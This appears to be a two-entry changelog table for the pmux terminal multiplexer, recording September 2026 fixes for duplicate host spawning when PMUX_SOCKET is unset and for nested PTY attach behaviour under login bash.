| 2026-09-01 | **FIXED** (PT-171) — a bare-launched host (no `PMUX_SOCKET`: Dock, Finder, a recorder, a shell) never registered `{stem}.host.pid`, so `pmux space open` spawned a second host beside the live one; the host now resolves its socket as `PMUX_SOCKET` else the default instance for registration, ack, attach-tabs cache, `ls`, and child env (`demo/pt171-check.sh` proves the regroup in the Docker box) |
| 2026-09-08 | **FIXED** (PT-306 / #330) — host seats that ran `pmux attach` / `pmux-attach --session` under a login bash stayed nested PTY attaches (`[scroll N/M]`, no host chip/bar). Those commands now write the attach-tabs cache so the host opens a log replica; leftover nested attaches promote; nested fallback chrome matches the host chip and bar |
